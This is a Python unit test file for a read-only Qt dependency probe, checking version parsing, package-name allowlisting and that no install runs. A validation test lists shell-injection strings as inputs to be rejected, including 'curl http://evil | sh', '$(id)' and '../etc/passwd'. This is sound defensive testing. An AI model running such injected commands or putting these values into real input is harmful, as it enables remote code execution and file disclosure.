"""Offline unit tests for the read-only Qt dependency report.

No test installs packages, compiles Qt, contacts a network or claims Linux Mint
or compiled-Qt acceptance. Host and CLI checks only verify probe behavior.
"""
import json
import platform
import subprocess
import sys
import unittest
from pathlib import Path

from canopy_features.mint.dependency_probe import (
    OPTIONAL_PACKAGES,
    REQUIRED_PACKAGES,
    REQUIRED_QT_VERSION,
    assess,
    collect,
    is_safe_package_name,
    parse_version,
    validate_package_names,
)

ROOT = Path(__file__).resolve().parents[1]
ALL_TOOLS = {"pkg-config": True, "dpkg-query": True}
ALL_INSTALLED = {name: True for name in REQUIRED_PACKAGES}


class DependencyProbeTests(unittest.TestCase):
    def test_required_packages_match_compiled_source_and_ci(self):
        cmake = (ROOT / "prototype" / "classic" / "CMakeLists.txt").read_text(
            encoding="utf-8"
        )
        workflow = (ROOT / ".github" / "workflows" / "classic-qt.yml").read_text(
            encoding="utf-8"
        )
        self.assertIn("find_package(Qt6 6.4 REQUIRED", cmake)
        self.assertIn("QuickControls2", cmake)
        self.assertEqual(REQUIRED_QT_VERSION, (6, 4))
        for name in REQUIRED_PACKAGES + OPTIONAL_PACKAGES:
            with self.subTest(package=name):
                self.assertIn(name, workflow)

    def test_report_is_probe_only_and_never_installs(self):
        report = assess("6.4.2", ALL_INSTALLED, ALL_TOOLS)
        self.assertTrue(report["probe_only"])
        self.assertFalse(report["install_attempted"])
        self.assertEqual(report["install_commands_run"], [])
        self.assertEqual(report["status"], "READY")
        self.assertEqual(report["missing_packages"], [])
        self.assertEqual(report["unknown_packages"], [])
        self.assertEqual(len(report["packages"]), len(REQUIRED_PACKAGES))

    def test_missing_tools_are_reported_with_unknown_states(self):
        report = assess(None, {}, {"pkg-config": False, "dpkg-query": False})
        self.assertEqual(report["status"], "UNVERIFIED")
        self.assertEqual(report["qt_core_version"], None)
        self.assertFalse(report["qt_version_supported"])
        blockers = " ".join(report["blockers"])
        self.assertIn("pkg-config", blockers)
        self.assertIn("dpkg-query", blockers)
        self.assertEqual(
            report["unknown_packages"], list(REQUIRED_PACKAGES)
        )
        self.assertTrue(
            all(p["status"] == "UNKNOWN" for p in report["packages"])
        )
        self.assertFalse(report["install_attempted"])

    def test_old_qt_is_reported(self):
        report = assess("6.2.4", ALL_INSTALLED, ALL_TOOLS)
        self.assertEqual(report["status"], "UPGRADE_QT")
        self.assertFalse(report["qt_version_supported"])
        blockers = " ".join(report["blockers"])
        self.assertIn("6.2.4", blockers)
        self.assertIn("6.4", blockers)
        self.assertEqual(report["missing_packages"], [])

    def test_newer_qt_meets_minimum(self):
        report = assess("6.10.0", ALL_INSTALLED, ALL_TOOLS)
        self.assertTrue(report["qt_version_supported"])
        self.assertEqual(report["status"], "READY")

    def test_missing_package_is_listed(self):
        installed = dict(ALL_INSTALLED)
        installed["libqt6svg6"] = False
        report = assess("6.4.2", installed, ALL_TOOLS)
        self.assertEqual(report["status"], "PACKAGES_MISSING")
        self.assertEqual(report["missing_packages"], ["libqt6svg6"])
        self.assertTrue(report["qt_version_supported"])

    def test_untrusted_package_names_are_rejected(self):
        safe, rejected = validate_package_names([
            "qt6-base-dev",
            "qt6-base-dev; curl http://evil | sh",
            "../etc/passwd",
            "APT::Option",
            "",
        ])
        self.assertEqual(safe, ("qt6-base-dev",))
        self.assertEqual(rejected, 4)

    def test_untrusted_name_blocks_report_without_echo(self):
        report = assess(
            "6.4.2",
            ALL_INSTALLED,
            ALL_TOOLS,
            required_names=["qt6-base-dev", "qt6-base-dev;id"],
        )
        self.assertEqual(report["status"], "BLOCKED")
        self.assertIn("untrusted package name", " ".join(report["blockers"]))
        self.assertNotIn("qt6-base-dev;id", json.dumps(report))
        self.assertEqual(
            [p["name"] for p in report["packages"]], ["qt6-base-dev"]
        )
        self.assertFalse(report["install_attempted"])

    def test_package_name_allowlist_rejects_shell_syntax(self):
        for name in ("qt6-base-dev", "libqt6svg6",
                     "qml6-module-qtquick-controls"):
            with self.subTest(name=name):
                self.assertTrue(is_safe_package_name(name))
        for name in ("", "-leading", "Upper", "has space", "a;b", "a\n b",
                     "pkg/../x", "$(id)", "a" * 65, None, 7):
            with self.subTest(name=name):
                self.assertFalse(is_safe_package_name(name))
        for name in REQUIRED_PACKAGES + OPTIONAL_PACKAGES:
            self.assertTrue(is_safe_package_name(name))

    def test_version_parser_is_strict(self):
        self.assertEqual(parse_version("6.4"), (6, 4))
        self.assertEqual(parse_version("6.4.2"), (6, 4, 2))
        self.assertGreater(parse_version("6.10.0"), parse_version("6.4.2"))
        for bad in (None, "", "6", "6.4.2;id", "v6.4.2", "6.4.2.1.5",
                    "6.4.x", "-6.4", "6." * 20, "9" * 41, 642):
            with self.subTest(bad=bad):
                self.assertIsNone(parse_version(bad))

    def test_collect_on_host_never_claims_mint_or_install(self):
        report = collect()
        self.assertTrue(report["probe_only"])
        self.assertFalse(report["install_attempted"])
        self.assertEqual(report["install_commands_run"], [])
        self.assertEqual(report["host_os"], platform.system())
        self.assertIsInstance(report["mint_verified"], bool)
        self.assertTrue(report["packages"])
        self.assertTrue(
            all(is_safe_package_name(p["name"]) for p in report["packages"])
        )
        if platform.system() == "Windows":
            self.assertFalse(report["mint_verified"])
            self.assertEqual(report["status"], "UNVERIFIED")

    def test_cli_json_is_probe_only(self):
        proc = subprocess.run(
            [sys.executable, "-m", "canopy_features.mint.dependency_probe",
             "--json"],
            cwd=ROOT, capture_output=True, text=True, check=False, timeout=20,
        )
        self.assertEqual(proc.returncode, 0, proc.stderr)
        report = json.loads(proc.stdout)
        self.assertTrue(report["probe_only"])
        self.assertFalse(report["install_attempted"])
        self.assertEqual(report["install_commands_run"], [])
        self.assertIn("CMakeLists.txt", report["source"])
        self.assertNotIn("apt-get", proc.stdout)


if __name__ == "__main__":
    unittest.main()
